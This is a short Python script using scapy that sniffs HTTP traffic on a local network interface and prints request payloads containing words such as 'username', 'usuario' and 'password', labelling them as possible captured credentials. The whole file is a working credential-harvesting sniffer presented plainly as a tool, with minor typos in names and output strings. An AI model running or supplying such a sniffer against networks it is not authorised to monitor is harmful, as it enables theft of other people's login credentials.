from scapy.all import *
from scapy_http import http

wordlist = ["username", "user", "usuario", "password","nickname"]

def capure_http(pkt):
    if pkt.haslayer(http.HTTPRequest):
        print("IP: {}\tDestiny: {}\tHost: {}".format(pkt[IP].src, pkt[IP].dst, str(pkt[http.HTTPRequest].Host)))
        if pkt.haslayer(Raw)     :
            load = pkt[Raw].load
            load = load.lower()
            for w in wordlist:
                if w in load:
                    print("[+] POSSIBLE USER OR PASSWIRD: {}".format(load))
    


def main():
    print("Capturing packages")
    sniff(iface="enp0s3", store=False, prn=capure_http)

if __name__ == "__main__":
    main()